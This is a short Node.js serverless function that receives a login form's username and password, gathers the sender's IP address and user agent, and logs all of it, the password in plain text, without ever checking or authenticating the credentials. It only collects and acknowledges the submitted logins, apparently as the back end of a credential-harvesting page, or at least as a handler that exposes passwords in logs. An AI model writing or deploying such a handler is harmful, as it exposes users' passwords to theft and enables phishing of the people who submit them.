const fetch = require('node-fetch');

exports.handler = async function (event, context) {
    const { username, password } = JSON.parse(event.body); // Extract form data
    const ip_address = event.headers['x-forwarded-for'] || event.connection.remoteAddress; // Get IP
    const user_agent = event.headers['user-agent']; // Get User-Agent
    
    // Log the information (you can connect this to a database later if needed)
    console.log('Login attempt:', { username, password, ip_address, user_agent });
    
    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Login data received!' })
    };
};
